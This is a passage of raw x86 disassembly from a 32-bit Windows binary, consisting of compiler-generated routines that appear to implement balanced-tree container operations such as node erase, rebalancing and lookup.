   147f6:	mov    esi,DWORD PTR [eax+0x4]
   147f9:	jmp    0x1482a
   147fb:	cmp    esi,DWORD PTR [eax]
   147fd:	jne    0x14809
   147ff:	mov    esi,eax
   14801:	push   esi
   14802:	mov    ecx,edi
   14804:	call   0x12db8
   14809:	mov    eax,DWORD PTR [esi+0x4]
   1480c:	mov    DWORD PTR [eax+0x14],0x1
   14813:	mov    eax,DWORD PTR [esi+0x4]
   14816:	mov    eax,DWORD PTR [eax+0x4]
   14819:	and    DWORD PTR [eax+0x14],0x0
   1481d:	mov    eax,DWORD PTR [esi+0x4]
   14820:	push   DWORD PTR [eax+0x4]
   14823:	mov    ecx,edi
   14825:	call   0x12d6a
   1482a:	mov    eax,DWORD PTR [edi+0x4]
   1482d:	cmp    esi,DWORD PTR [eax+0x4]
   14830:	jne    0x14788
   14836:	mov    eax,DWORD PTR [edi+0x4]
   14839:	mov    eax,DWORD PTR [eax+0x4]
   1483c:	pop    edi
   1483d:	mov    DWORD PTR [eax+0x14],0x1
   14844:	mov    eax,DWORD PTR [ebp+0x8]
   14847:	pop    esi
   14848:	mov    DWORD PTR [eax],ebx
   1484a:	pop    ebx
   1484b:	pop    ebp
   1484c:	ret    0x10
   1484f:	int3   
   14850:	int3   
   14851:	int3   
   14852:	int3   
   14853:	int3   
   14854:	mov    edi,edi
   14856:	push   ebp
   14857:	mov    ebp,esp
   14859:	push   ecx
   1485a:	push   ecx
   1485b:	push   ebx
   1485c:	push   esi
   1485d:	mov    DWORD PTR [ebp-0x4],ecx
   14860:	push   edi
   14861:	mov    edi,DWORD PTR [ebp+0xc]
   14864:	lea    ecx,[ebp+0xc]
   14867:	call   0x11548
   1486c:	mov    esi,DWORD PTR [edi]
   1486e:	mov    eax,ds:0x7f6d8
   14873:	mov    ebx,edi
   14875:	mov    DWORD PTR [ebp-0x8],esi
   14878:	cmp    esi,eax
   1487a:	jne    0x14898
   1487c:	mov    esi,DWORD PTR [edi+0x8]
   1487f:	mov    eax,DWORD PTR [ebx+0x4]
   14882:	mov    ecx,DWORD PTR [ebp-0x4]
   14885:	mov    DWORD PTR [esi+0x4],eax
   14888:	mov    eax,DWORD PTR [ecx+0x4]
   1488b:	cmp    DWORD PTR [eax+0x4],edi
   1488e:	jne    0x1490d
   14890:	mov    DWORD PTR [eax+0x4],esi
   14893:	jmp    0x1491b
   14898:	mov    ecx,DWORD PTR [edi+0x8]
   1489b:	cmp    ecx,eax
   1489d:	je     0x1487f
   1489f:	push   ecx
   148a0:	call   0x11422
   148a5:	mov    ebx,eax
   148a7:	mov    esi,DWORD PTR [ebx+0x8]
   148aa:	cmp    ebx,edi
   148ac:	je     0x1487f
   148ae:	mov    eax,DWORD PTR [ebp-0x8]
   148b1:	mov    DWORD PTR [eax+0x4],ebx
   148b4:	mov    eax,DWORD PTR [edi]
   148b6:	mov    DWORD PTR [ebx],eax
   148b8:	cmp    ebx,DWORD PTR [edi+0x8]
   148bb:	jne    0x148c2
   148bd:	mov    DWORD PTR [esi+0x4],ebx
   148c0:	jmp    0x148d9
   148c2:	mov    eax,DWORD PTR [ebx+0x4]
   148c5:	mov    DWORD PTR [esi+0x4],eax
   148c8:	mov    eax,DWORD PTR [ebx+0x4]
   148cb:	mov    DWORD PTR [eax],esi
   148cd:	mov    eax,DWORD PTR [edi+0x8]
   148d0:	mov    DWORD PTR [ebx+0x8],eax
   148d3:	mov    eax,DWORD PTR [edi+0x8]
   148d6:	mov    DWORD PTR [eax+0x4],ebx
   148d9:	mov    eax,DWORD PTR [ebp-0x4]
   148dc:	mov    eax,DWORD PTR [eax+0x4]
   148df:	cmp    DWORD PTR [eax+0x4],edi
   148e2:	jne    0x148e9
   148e4:	mov    DWORD PTR [eax+0x4],ebx
   148e7:	jmp    0x148f7
   148e9:	mov    eax,DWORD PTR [edi+0x4]
   148ec:	cmp    DWORD PTR [eax],edi
   148ee:	jne    0x148f4
   148f0:	mov    DWORD PTR [eax],ebx
   148f2:	jmp    0x148f7
   148f4:	mov    DWORD PTR [eax+0x8],ebx
   148f7:	mov    eax,DWORD PTR [edi+0x4]
   148fa:	mov    DWORD PTR [ebx+0x4],eax
   148fd:	mov    eax,DWORD PTR [ebx+0x1c]
   14900:	mov    ecx,DWORD PTR [edi+0x1c]
   14903:	mov    DWORD PTR [ebx+0x1c],ecx
   14906:	mov    DWORD PTR [edi+0x1c],eax
   14909:	mov    ebx,edi
   1490b:	jmp    0x1496e
   1490d:	mov    eax,DWORD PTR [edi+0x4]
   14910:	cmp    DWORD PTR [eax],edi
   14912:	jne    0x14918
   14914:	mov    DWORD PTR [eax],esi
   14916:	jmp    0x1491b
   14918:	mov    DWORD PTR [eax+0x8],esi
   1491b:	mov    eax,DWORD PTR [ecx+0x4]
   1491e:	mov    DWORD PTR [ebp-0x8],eax
   14921:	cmp    DWORD PTR [eax],edi
   14923:	jne    0x14945
   14925:	mov    edx,DWORD PTR [edi+0x8]
   14928:	cmp    edx,DWORD PTR ds:0x7f6d8
   1492e:	jne    0x14937
   14930:	mov    edx,DWORD PTR [edi+0x4]
   14933:	mov    DWORD PTR [eax],edx
   14935:	jmp    0x14945
   14937:	push   esi
   14938:	call   0x11422
   1493d:	mov    ecx,DWORD PTR [ebp-0x8]
   14940:	mov    DWORD PTR [ecx],eax
   14942:	mov    ecx,DWORD PTR [ebp-0x4]
   14945:	mov    eax,DWORD PTR [ecx+0x4]
   14948:	mov    DWORD PTR [ebp-0x8],eax
   1494b:	cmp    DWORD PTR [eax+0x8],edi
   1494e:	jne    0x1496e
   14950:	mov    ecx,DWORD PTR [edi]
   14952:	cmp    ecx,DWORD PTR ds:0x7f6d8
   14958:	jne    0x14962
   1495a:	mov    ecx,DWORD PTR [edi+0x4]
   1495d:	mov    DWORD PTR [eax+0x8],ecx
   14960:	jmp    0x1496e
   14962:	push   esi
   14963:	call   0x11400
   14968:	mov    ecx,DWORD PTR [ebp-0x8]
   1496b:	mov    DWORD PTR [ecx+0x8],eax
   1496e:	xor    edi,edi
   14970:	inc    edi
   14971:	cmp    DWORD PTR [ebx+0x1c],edi
   14974:	jne    0x14a8b
   1497a:	jmp    0x14a39
   1497f:	cmp    DWORD PTR [esi+0x1c],edi
   14982:	jne    0x14a88
   14988:	mov    eax,DWORD PTR [esi+0x4]
   1498b:	cmp    esi,DWORD PTR [eax]
   1498d:	jne    0x14a04
   1498f:	mov    eax,DWORD PTR [eax+0x8]
   14992:	cmp    DWORD PTR [eax+0x1c],0x0
   14996:	jne    0x149b0
   14998:	mov    DWORD PTR [eax+0x1c],edi
   1499b:	mov    eax,DWORD PTR [esi+0x4]
   1499e:	and    DWORD PTR [eax+0x1c],0x0
   149a2:	push   DWORD PTR [esi+0x4]
   149a5:	call   0x13160
   149aa:	mov    eax,DWORD PTR [esi+0x4]
   149ad:	mov    eax,DWORD PTR [eax+0x8]
   149b0:	mov    ecx,DWORD PTR [eax]
   149b2:	cmp    DWORD PTR [ecx+0x1c],edi
   149b5:	jne    0x149bf
   149b7:	mov    ecx,DWORD PTR [eax+0x8]
   149ba:	cmp    DWORD PTR [ecx+0x1c],edi
   149bd:	je     0x14a32
   149bf:	mov    ecx,DWORD PTR [eax+0x8]
   149c2:	cmp    DWORD PTR [ecx+0x1c],edi
   149c5:	jne    0x149df
   149c7:	mov    ecx,DWORD PTR [eax]
   149c9:	mov    DWORD PTR [ecx+0x1c],edi
   149cc:	mov    ecx,DWORD PTR [ebp-0x4]
   149cf:	and    DWORD PTR [eax+0x1c],0x0
   149d3:	push   eax
   149d4:	call   0x131ae
   149d9:	mov    eax,DWORD PTR [esi+0x4]
   149dc:	mov    eax,DWORD PTR [eax+0x8]
   149df:	mov    ecx,DWORD PTR [esi+0x4]
   149e2:	mov    ecx,DWORD PTR [ecx+0x1c]
   149e5:	mov    DWORD PTR [eax+0x1c],ecx
   149e8:	mov    ecx,DWORD PTR [esi+0x4]
   149eb:	mov    DWORD PTR [ecx+0x1c],edi
   149ee:	mov    eax,DWORD PTR [eax+0x8]
   149f1:	mov    ecx,DWORD PTR [ebp-0x4]
   149f4:	mov    DWORD PTR [eax+0x1c],edi
   149f7:	push   DWORD PTR [esi+0x4]
   149fa:	call   0x13160
   149ff:	jmp    0x14a88
   14a04:	mov    eax,DWORD PTR [eax]
   14a06:	cmp    DWORD PTR [eax+0x1c],0x0
   14a0a:	jne    0x14a23
   14a0c:	mov    DWORD PTR [eax+0x1c],edi
   14a0f:	mov    eax,DWORD PTR [esi+0x4]
   14a12:	and    DWORD PTR [eax+0x1c],0x0
   14a16:	push   DWORD PTR [esi+0x4]
   14a19:	call   0x131ae
   14a1e:	mov    eax,DWORD PTR [esi+0x4]
   14a21:	mov    eax,DWORD PTR [eax]
   14a23:	mov    ecx,DWORD PTR [eax+0x8]
   14a26:	cmp    DWORD PTR [ecx+0x1c],edi
   14a29:	jne    0x14a4a
   14a2b:	mov    ecx,DWORD PTR [eax]
   14a2d:	cmp    DWORD PTR [ecx+0x1c],edi
   14a30:	jne    0x14a4a
   14a32:	and    DWORD PTR [eax+0x1c],0x0
   14a36:	mov    esi,DWORD PTR [esi+0x4]
   14a39:	mov    ecx,DWORD PTR [ebp-0x4]
   14a3c:	mov    eax,DWORD PTR [ecx+0x4]
   14a3f:	cmp    esi,DWORD PTR [eax+0x4]
   14a42:	jne    0x1497f
   14a48:	jmp    0x14a88
   14a4a:	mov    ecx,DWORD PTR [eax]
   14a4c:	cmp    DWORD PTR [ecx+0x1c],edi
   14a4f:	jne    0x14a69
   14a51:	mov    ecx,DWORD PTR [eax+0x8]
   14a54:	mov    DWORD PTR [ecx+0x1c],edi
   14a57:	mov    ecx,DWORD PTR [ebp-0x4]
   14a5a:	and    DWORD PTR [eax+0x1c],0x0
   14a5e:	push   eax
   14a5f:	call   0x13160
   14a64:	mov    eax,DWORD PTR [esi+0x4]
   14a67:	mov    eax,DWORD PTR [eax]
   14a69:	mov    ecx,DWORD PTR [esi+0x4]
   14a6c:	mov    ecx,DWORD PTR [ecx+0x1c]
   14a6f:	mov    DWORD PTR [eax+0x1c],ecx
   14a72:	mov    ecx,DWORD PTR [esi+0x4]
   14a75:	mov    DWORD PTR [ecx+0x1c],edi
   14a78:	mov    eax,DWORD PTR [eax]
   14a7a:	mov    ecx,DWORD PTR [ebp-0x4]
   14a7d:	mov    DWORD PTR [eax+0x1c],edi
   14a80:	push   DWORD PTR [esi+0x4]
   14a83:	call   0x131ae
   14a88:	mov    DWORD PTR [esi+0x1c],edi
   14a8b:	lea    eax,[ebx+0xc]
   14a8e:	push   eax
   14a8f:	call   0x134a2
   14a94:	push   ebx
   14a95:	call   0x10a9a
   14a9a:	mov    eax,DWORD PTR [ebp-0x4]
   14a9d:	dec    DWORD PTR [eax+0xc]
   14aa0:	mov    eax,DWORD PTR [ebp+0x8]
   14aa3:	pop    ecx
   14aa4:	mov    ecx,DWORD PTR [ebp+0xc]
   14aa7:	pop    edi
   14aa8:	pop    esi
   14aa9:	mov    DWORD PTR [eax],ecx
   14aab:	pop    ebx
   14aac:	leave  
   14aad:	ret    0x8
   14ab0:	int3   
   14ab1:	int3   
   14ab2:	int3   
   14ab3:	int3   
   14ab4:	int3   
   14ab5:	int3   
   14ab6:	mov    edi,edi
   14ab8:	push   ebp
   14ab9:	mov    ebp,esp
   14abb:	push   ebx
   14abc:	push   esi
   14abd:	push   edi
   14abe:	mov    edi,DWORD PTR [ebp+0x8]
   14ac1:	mov    ebx,ecx
   14ac3:	mov    esi,edi
   14ac5:	cmp    edi,DWORD PTR ds:0x7f6d8
   14acb:	je     0x14af3
   14acd:	push   DWORD PTR [esi+0x8]
   14ad0:	mov    ecx,ebx
   14ad2:	call   0x14ab6
   14ad7:	mov    esi,DWORD PTR [esi]
   14ad9:	lea    eax,[edi+0xc]
   14adc:	push   eax
   14add:	call   0x134a2
   14ae2:	push   edi
   14ae3:	call   0x10a9a
   14ae8:	pop    ecx
   14ae9:	mov    edi,esi
   14aeb:	cmp    esi,DWORD PTR ds:0x7f6d8
   14af1:	jne    0x14acd
   14af3:	pop    edi
   14af4:	pop    esi
   14af5:	pop    ebx
   14af6:	pop    ebp
   14af7:	ret    0x4
   14afa:	int3   
   14afb:	int3   
   14afc:	int3   
   14afd:	int3   
   14afe:	int3   
   14aff:	int3   
   14b00:	mov    edi,edi
   14b02:	push   esi
   14b03:	push   edi
   14b04:	push   0x1
   14b06:	xor    edi,edi
   14b08:	push   edi
   14b09:	mov    esi,ecx
   14b0b:	call   0x139c8
   14b10:	cmp    DWORD PTR ds:0x7f6e0,edi
   14b16:	jne    0x14b2d
   14b18:	mov    ecx,eax
   14b1a:	mov    DWORD PTR ds:0x7f6e0,ecx
   14b20:	mov    DWORD PTR [ecx],edi
   14b22:	mov    ecx,DWORD PTR ds:0x7f6e0
   14b28:	xor    eax,eax
   14b2a:	mov    DWORD PTR [ecx+0x8],edi
   14b2d:	inc    DWORD PTR ds:0x7f838
   14b33:	cmp    eax,edi
   14b35:	je     0x14b3e
   14b37:	push   eax
   14b38:	call   0x10a9a
   14b3d:	pop    ecx
   14b3e:	push   edi
   14b3f:	push   DWORD PTR ds:0x7f6e0
   14b45:	mov    ecx,esi
   14b47:	call   0x139c8
   14b4c:	mov    DWORD PTR [esi+0xc],edi
   14b4f:	mov    DWORD PTR [esi+0x4],eax
   14b52:	mov    DWORD PTR [eax],eax
   14b54:	mov    esi,DWORD PTR [esi+0x4]
   14b57:	pop    edi
   14b58:	mov    DWORD PTR [esi+0x8],esi
   14b5b:	pop    esi
   14b5c:	ret    
   14b5d:	int3   
   14b5e:	int3   
   14b5f:	int3   
   14b60:	int3   
   14b61:	int3   
   14b62:	mov    edi,edi
   14b64:	push   ebp
   14b65:	mov    ebp,esp
   14b67:	push   ebx
   14b68:	mov    ebx,DWORD PTR [ebp+0x8]
   14b6b:	mov    eax,DWORD PTR [ebx+0x4]
   14b6e:	push   esi
   14b6f:	push   edi
   14b70:	mov    esi,ecx
   14b72:	mov    edi,DWORD PTR [esi+0x4]
   14b75:	add    eax,0x4
   14b78:	push   edi
   14b79:	push   DWORD PTR [eax]
   14b7b:	call   0x13b8a
   14b80:	mov    DWORD PTR [edi+0x4],eax
   14b83:	mov    eax,DWORD PTR [ebx+0xc]
   14b86:	mov    edi,DWORD PTR [esi+0x4]
   14b89:	mov    DWORD PTR [esi+0xc],eax
   14b8c:	mov    eax,DWORD PTR [edi+0x4]
   14b8f:	cmp    eax,DWORD PTR ds:0x7f6cc
   14b95:	je     0x14baf
   14b97:	push   eax
   14b98:	call   0x11224
   14b9d:	mov    DWORD PTR [edi],eax
   14b9f:	mov    esi,DWORD PTR [esi+0x4]
   14ba2:	push   DWORD PTR [esi+0x4]
   14ba5:	call   0x11202
   14baa:	mov    DWORD PTR [esi+0x8],eax
   14bad:	jmp    0x14bb7
   14baf:	mov    DWORD PTR [edi],edi
   14bb1:	mov    esi,DWORD PTR [esi+0x4]
   14bb4:	mov    DWORD PTR [esi+0x8],esi
   14bb7:	pop    edi
   14bb8:	pop    esi
   14bb9:	pop    ebx
   14bba:	pop    ebp
   14bbb:	ret    0x4
   14bbe:	int3   
   14bbf:	int3   
   14bc0:	int3   
   14bc1:	int3   
   14bc2:	int3   
   14bc3:	int3   
   14bc4:	mov    edi,edi
   14bc6:	push   ebp
   14bc7:	mov    ebp,esp
   14bc9:	push   edi
   14bca:	mov    edi,DWORD PTR [ebp+0xc]
   14bcd:	cmp    DWORD PTR [ebp+0x8],edi
   14bd0:	je     0x14be6
   14bd2:	push   esi
   14bd3:	mov    esi,DWORD PTR [ebp+0x10]
   14bd6:	inc    DWORD PTR [esi]
   14bd8:	lea    ecx,[ebp+0x8]
   14bdb:	call   0x1387e
   14be0:	cmp    DWORD PTR [ebp+0x8],edi
   14be3:	jne    0x14bd6
   14be5:	pop    esi
   14be6:	pop    edi
   14be7:	pop    ebp
   14be8:	ret    
   14be9:	int3   
   14bea:	int3   
   14beb:	int3   
   14bec:	int3   
   14bed:	int3   
   14bee:	mov    edi,edi
   14bf0:	push   ebp
   14bf1:	mov    ebp,esp
   14bf3:	push   DWORD PTR [ebp+0xc]
   14bf6:	push   DWORD PTR [ebp+0x8]
   14bf9:	call   0x13c84
   14bfe:	mov    eax,DWORD PTR [ebp+0x8]
   14c01:	pop    ebp
   14c02:	ret    0x8
   14c05:	int3   
   14c06:	int3   
   14c07:	int3   
   14c08:	int3   
   14c09:	int3   
   14c0a:	mov    edi,edi
   14c0c:	push   ebp
   14c0d:	mov    ebp,esp
   14c0f:	push   ecx
   14c10:	push   esi
   14c11:	mov    esi,ecx
   14c13:	cmp    DWORD PTR [esi+0xc],0x0
   14c17:	mov    ecx,DWORD PTR [ebp+0xc]
   14c1a:	je     0x14c54
   14c1c:	mov    eax,DWORD PTR [esi+0x4]
   14c1f:	cmp    ecx,DWORD PTR [eax]
   14c21:	jne    0x14c54
   14c23:	cmp    DWORD PTR [ebp+0x10],eax
   14c26:	jne    0x14c54
   14c28:	push   DWORD PTR [eax+0x4]
   14c2b:	mov    ecx,esi
   14c2d:	call   0x138dc
   14c32:	mov    ecx,DWORD PTR ds:0x7f6c8
   14c38:	mov    eax,DWORD PTR [esi+0x4]
   14c3b:	mov    DWORD PTR [eax+0x4],ecx
   14c3e:	mov    eax,DWORD PTR [esi+0x4]
   14c41:	and    DWORD PTR [esi+0xc],0x0
   14c45:	mov    DWORD PTR [eax],eax
   14c47:	mov    eax,DWORD PTR [esi+0x4]
   14c4a:	mov    DWORD PTR [eax+0x8],eax
   14c4d:	mov    eax,DWORD PTR [esi+0x4]
   14c50:	mov    ecx,DWORD PTR [eax]
   14c52:	jmp    0x14c79
   14c54:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c57:	je     0x14c79
   14c59:	push   edi
   14c5a:	mov    edi,ecx
   14c5c:	lea    ecx,[ebp+0xc]
   14c5f:	call   0x112ca
   14c64:	push   edi
   14c65:	lea    eax,[ebp-0x4]
   14c68:	push   eax
   14c69:	mov    ecx,esi
   14c6b:	call   0x13d76
   14c70:	mov    ecx,DWORD PTR [ebp+0xc]
   14c73:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c76:	jne    0x14c5a
   14c78:	pop    edi
   14c79:	mov    eax,DWORD PTR [ebp+0x8]
   14c7c:	mov    DWORD PTR [eax],ecx
   14c7e:	pop    esi
   14c7f:	leave  
   14c80:	ret    0xc
   14c83:	int3   
   14c84:	int3   
   14c85:	int3   
   14c86:	int3   
   14c87:	int3   
   14c88:	mov    edi,edi
   14c8a:	push   ebp
   14c8b:	mov    ebp,esp
   14c8d:	push   ecx
   14c8e:	push   ecx
   14c8f:	push   esi
   14c90:	push   DWORD PTR [ebp+0x8]
   14c93:	lea    eax,[ebp-0x8]
   14c96:	push   eax
   14c97:	mov    esi,ecx
   14c99:	call   0x13fce
   14c9e:	and    DWORD PTR [ebp+0x8],0x0
   14ca2:	lea    eax,[ebp+0x8]
   14ca5:	push   eax
   14ca6:	push   DWORD PTR [ebp-0x4]
   14ca9:	push   DWORD PTR [ebp-0x8]
   14cac:	call   0x13a3c
   14cb1:	add    esp,0xc
   14cb4:	push   DWORD PTR [ebp-0x4]
   14cb7:	lea    eax,[ebp-0x4]
   14cba:	push   DWORD PTR [ebp-0x8]
   14cbd:	mov    ecx,esi
   14cbf:	push   eax
   14cc0:	call   0x14c0a
   14cc5:	mov    eax,DWORD PTR [ebp+0x8]
   14cc8:	pop    esi
   14cc9:	leave  
   14cca:	ret    0x4
   14ccd:	int3   
   14cce:	int3   
   14ccf:	int3   
   14cd0:	int3   
   14cd1:	int3   
   14cd2:	mov    edi,edi
   14cd4:	push   ebp
   14cd5:	mov    ebp,esp
   14cd7:	push   ecx
   14cd8:	push   ebx
   14cd9:	push   esi
   14cda:	push   edi
   14cdb:	mov    edi,ecx
   14cdd:	mov    eax,DWORD PTR [edi+0x4]
   14ce0:	mov    esi,DWORD PTR [eax+0x4]
   14ce3:	mov    ebx,eax
   14ce5:	mov    eax,ds:0x7f6cc
   14cea:	mov    dl,0x1
   14cec:	cmp    esi,eax
   14cee:	je     0x14d0c
   14cf0:	mov    ecx,DWORD PTR [ebp+0xc]
   14cf3:	mov    ecx,DWORD PTR [ecx]
   14cf5:	cmp    ecx,DWORD PTR [esi+0xc]
   14cf8:	mov    ebx,esi
   14cfa:	setb   dl
   14cfd:	test   dl,dl
   14cff:	je     0x14d05
   14d01:	mov    esi,DWORD PTR [esi]
   14d03:	jmp    0x14d08
   14d05:	mov    esi,DWORD PTR [esi+0x8]
   14d08:	cmp    esi,eax
   14d0a:	jne    0x14cf5
   14d0c:	cmp    BYTE PTR [edi+0x8],0x0
   14d10:	je     0x14d2d
   14d12:	push   DWORD PTR [ebp+0xc]
   14d15:	push   ebx
   14d16:	push   esi
   14d17:	lea    eax,[ebp+0xc]
   14d1a:	push   eax
   14d1b:	mov    ecx,edi
   14d1d:	call   0x14552
   14d22:	mov    ecx,DWORD PTR [eax]
   14d24:	mov    eax,DWORD PTR [ebp+0x8]
   14d27:	mov    BYTE PTR [eax+0x4],0x1
   14d2b:	jmp    0x14d5c
   14d2d:	mov    ecx,ebx
   14d2f:	mov    DWORD PTR [ebp-0x4],ecx
   14d32:	test   dl,dl
   14d34:	je     0x14d48
   14d36:	mov    eax,DWORD PTR [edi+0x4]
   14d39:	cmp    ebx,DWORD PTR [eax]
   14d3b:	je     0x14d12
   14d3d:	lea    ecx,[ebp-0x4]
   14d40:	call   0x12ef6
   14d45:	mov    ecx,DWORD PTR [ebp-0x4]
   14d48:	mov    edx,DWORD PTR [ecx+0xc]
   14d4b:	mov    eax,DWORD PTR [ebp+0xc]
   14d4e:	cmp    edx,DWORD PTR [eax]
   14d50:	jae    0x14d55
   14d52:	push   eax
   14d53:	jmp    0x14d15
   14d55:	mov    eax,DWORD PTR [ebp+0x8]
   14d58:	mov    BYTE PTR [eax+0x4],0x0
   14d5c:	pop    edi
   14d5d:	pop    esi
   14d5e:	mov    DWORD PTR [eax],ecx
   14d60:	pop    ebx
   14d61:	leave  
   14d62:	ret    0x8
   14d65:	int3   
   14d66:	int3   
   14d67:	int3   
   14d68:	int3   
   14d69:	int3   
   14d6a:	mov    edi,edi
   14d6c:	push   ebp
   14d6d:	mov    ebp,esp
   14d6f:	push   ecx
   14d70:	push   esi
   14d71:	mov    esi,ecx
   14d73:	cmp    DWORD PTR [esi+0xc],0x0
   14d77:	mov    ecx,DWORD PTR [ebp+0xc]
   14d7a:	je     0x14db4
   14d7c:	mov    eax,DWORD PTR [esi+0x4]
   14d7f:	cmp    ecx,DWORD PTR [eax]
   14d81:	jne    0x14db4
   14d83:	cmp    DWORD PTR [ebp+0x10],eax
   14d86:	jne    0x14db4
   14d88:	push   DWORD PTR [eax+0x4]
   14d8b:	mov    ecx,esi
   14d8d:	call   0x1391c
   14d92:	mov    ecx,DWORD PTR ds:0x7f6cc
   14d98:	mov    eax,DWORD PTR [esi+0x4]
   14d9b:	mov    DWORD PTR [eax+0x4],ecx
   14d9e:	mov    eax,DWORD PTR [esi+0x4]
   14da1:	and    DWORD PTR [esi+0xc],0x0
   14da5:	mov    DWORD PTR [eax],eax
   14da7:	mov    eax,DWORD PTR [esi+0x4]
   14daa:	mov    DWORD PTR [eax+0x8],eax
   14dad:	mov    eax,DWORD PTR [esi+0x4]
   14db0:	mov    ecx,DWORD PTR [eax]
   14db2:	jmp    0x14dd9
   14db4:	cmp    ecx,DWORD PTR [ebp+0x10]
   14db7:	je     0x14dd9
   14db9:	push   edi
   14dba:	mov    edi,ecx
   14dbc:	lea    ecx,[ebp+0xc]
   14dbf:	call   0x12f36
   14dc4:	push   edi
   14dc5:	lea    eax,[ebp-0x4]
   14dc8:	push   eax
   14dc9:	mov    ecx,esi
   14dcb:	call   0x14266
   14dd0:	mov    ecx,DWORD PTR [ebp+0xc]
   14dd3:	cmp    ecx,DWORD PTR [ebp+0x10]
   14dd6:	jne    0x14dba
   14dd8:	pop    edi
   14dd9:	mov    eax,DWORD PTR [ebp+0x8]
   14ddc:	mov    DWORD PTR [eax],ecx
   14dde:	pop    esi
   14ddf:	leave  
   14de0:	ret    0xc
   14de3:	int3   
   14de4:	int3   
   14de5:	int3   
   14de6:	int3   
   14de7:	int3   
   14de8:	mov    edi,edi
   14dea:	push   ebp
   14deb:	mov    ebp,esp
   14ded:	push   ecx
   14dee:	push   ecx
   14def:	push   esi
   14df0:	push   DWORD PTR [ebp+0x8]
   14df3:	lea    eax,[ebp-0x8]
   14df6:	push   eax
   14df7:	mov    esi,ecx
   14df9:	call   0x144be
   14dfe:	and    DWORD PTR [ebp+0x8],0x0
   14e02:	lea    eax,[ebp+0x8]
   14e05:	push   eax
   14e06:	push   DWORD PTR [ebp-0x4]
   14e09:	push   DWORD PTR [ebp-0x8]
   14e0c:	call   0x13aa2
   14e11:	add    esp,0xc
   14e14:	push   DWORD PTR [ebp-0x4]
   14e17:	lea    eax,[ebp-0x4]
   14e1a:	push   DWORD PTR [ebp-0x8]
   14e1d:	mov    ecx,esi
   14e1f:	push   eax
   14e20:	call   0x14d6a
   14e25:	mov    eax,DWORD PTR [ebp+0x8]
   14e28:	pop    esi
   14e29:	leave  
   14e2a:	ret    0x4
   14e2d:	int3   
   14e2e:	int3   
   14e2f:	int3   
   14e30:	int3   
   14e31:	int3   
   14e32:	mov    edi,edi
   14e34:	push   ebp
   14e35:	mov    ebp,esp
   14e37:	push   ecx
   14e38:	push   ebx
   14e39:	push   esi
   14e3a:	push   edi
   14e3b:	mov    edi,ecx
   14e3d:	mov    eax,DWORD PTR [edi+0x4]
   14e40:	mov    esi,DWORD PTR [eax+0x4]
   14e43:	mov    ebx,eax
   14e45:	mov    eax,ds:0x7f6c8
   14e4a:	mov    dl,0x1
   14e4c:	cmp    esi,eax
   14e4e:	je     0x14e6c
   14e50:	mov    ecx,DWORD PTR [ebp+0xc]
   14e53:	mov    ecx,DWORD PTR [ecx]
   14e55:	cmp    ecx,DWORD PTR [esi+0xc]
   14e58:	mov    ebx,esi
   14e5a:	setb   dl
   14e5d:	test   dl,dl
   14e5f:	je     0x14e65
   14e61:	mov    esi,DWORD PTR [esi]
   14e63:	jmp    0x14e68
   14e65:	mov    esi,DWORD PTR [esi+0x8]
   14e68:	cmp    esi,eax
   14e6a:	jne    0x14e55
   14e6c:	cmp    BYTE PTR [edi+0x8],0x0
   14e70:	je     0x14e8d
   14e72:	push   DWORD PTR [ebp+0xc]
   14e75:	push   ebx
   14e76:	push   esi
   14e77:	lea    eax,[ebp+0xc]
   14e7a:	push   eax
   14e7b:	mov    ecx,edi
   14e7d:	call   0x14704
   14e82:	mov    ecx,DWORD PTR [eax]
   14e84:	mov    eax,DWORD PTR [ebp+0x8]
   14e87:	mov    BYTE PTR [eax+0x4],0x1
   14e8b:	jmp    0x14ebc
   14e8d:	mov    ecx,ebx
   14e8f:	mov    DWORD PTR [ebp-0x4],ecx
   14e92:	test   dl,dl
   14e94:	je     0x14ea8
   14e96:	mov    eax,DWORD PTR [edi+0x4]
   14e99:	cmp    ebx,DWORD PTR [eax]
   14e9b:	je     0x14e72
   14e9d:	lea    ecx,[ebp-0x4]
   14ea0:	call   0x1128a
   14ea5:	mov    ecx,DWORD PTR [ebp-0x4]
   14ea8:	mov    edx,DWORD PTR [ecx+0xc]
   14eab:	mov    eax,DWORD PTR [ebp+0xc]
   14eae:	cmp    edx,DWORD PTR [eax]
   14eb0:	jae    0x14eb5
   14eb2:	push   eax
   14eb3:	jmp    0x14e75
   14eb5:	mov    eax,DWORD PTR [ebp+0x8]
   14eb8:	mov    BYTE PTR [eax+0x4],0x0
   14ebc:	pop    edi
   14ebd:	pop    esi
   14ebe:	mov    DWORD PTR [eax],ecx
   14ec0:	pop    ebx
   14ec1:	leave  
   14ec2:	ret    0x8
   14ec5:	int3   
   14ec6:	int3   
   14ec7:	int3   
   14ec8:	int3   
   14ec9:	int3   
   14eca:	mov    edi,edi
   14ecc:	push   ebp
   14ecd:	mov    ebp,esp
   14ecf:	push   ecx
   14ed0:	push   esi
   14ed1:	mov    esi,ecx
   14ed3:	cmp    DWORD PTR [esi+0xc],0x0
   14ed7:	mov    ecx,DWORD PTR [ebp+0xc]
   14eda:	je     0x14f14
   14edc:	mov    eax,DWORD PTR [esi+0x4]
   14edf:	cmp    ecx,DWORD PTR [eax]
   14ee1:	jne    0x14f14
   14ee3:	cmp    DWORD PTR [ebp+0x10],eax
   14ee6:	jne    0x14f14
   14ee8:	push   DWORD PTR [eax+0x4]
   14eeb:	mov    ecx,esi
   14eed:	call   0x14ab6
   14ef2:	mov    ecx,DWORD PTR ds:0x7f6d8
   14ef8:	mov    eax,DWORD PTR [esi+0x4]
   14efb:	mov    DWORD PTR [eax+0x4],ecx
   14efe:	mov    eax,DWORD PTR [esi+0x4]
   14f01:	and    DWORD PTR [esi+0xc],0x0
   14f05:	mov    DWORD PTR [eax],eax
   14f07:	mov    eax,DWORD PTR [esi+0x4]
   14f0a:	mov    DWORD PTR [eax+0x8],eax
   14f0d:	mov    eax,DWORD PTR [esi+0x4]
   14f10:	mov    ecx,DWORD PTR [eax]
   14f12:	jmp    0x14f39
   14f14:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f17:	je     0x14f39
   14f19:	push   edi
   14f1a:	mov    edi,ecx
   14f1c:	lea    ecx,[ebp+0xc]
   14f1f:	call   0x11548
   14f24:	push   edi
   14f25:	lea    eax,[ebp-0x4]
   14f28:	push   eax
   14f29:	mov    ecx,esi
   14f2b:	call   0x14854
   14f30:	mov    ecx,DWORD PTR [ebp+0xc]
   14f33:	cmp    ecx,DWORD PTR [ebp+0x10]
   14f36:	jne    0x14f1a
   14f38:	pop    edi
